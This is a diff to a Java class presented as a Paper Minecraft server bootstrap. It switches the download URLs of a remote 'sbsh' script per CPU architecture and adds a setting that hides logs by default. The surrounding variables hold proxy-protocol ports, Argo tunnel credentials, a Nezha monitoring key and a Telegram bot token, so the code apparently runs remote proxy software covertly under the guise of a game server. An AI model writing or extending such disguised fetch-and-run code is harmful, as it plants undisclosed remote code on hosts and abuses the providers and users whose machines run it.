@@ -25,7 +25,7 @@ public final class PaperBootstrap {
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
         "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO", "SHOW_LOG"
     };
 
     private PaperBootstrap() {
@@ -114,6 +114,7 @@ public final class PaperBootstrap {
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "voer");
         envVars.put("DISABLE_ARGO", "false");
+        envVars.put("SHOW_LOG", "no"); // 是否显示日志，no/false不显示，yes/true显示，默认不显示
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -151,9 +152,9 @@ public final class PaperBootstrap {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.31888.xyz/sbsh";
+            url = "https://amd64.00666.xyz/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.31888.xyz/sbsh";
+            url = "https://arm64.00666.xyz/sbsh";
         } else if (osArch.contains("s390x")) {
             url = "https://s390x.31888.xyz/sbsh";
         } else {
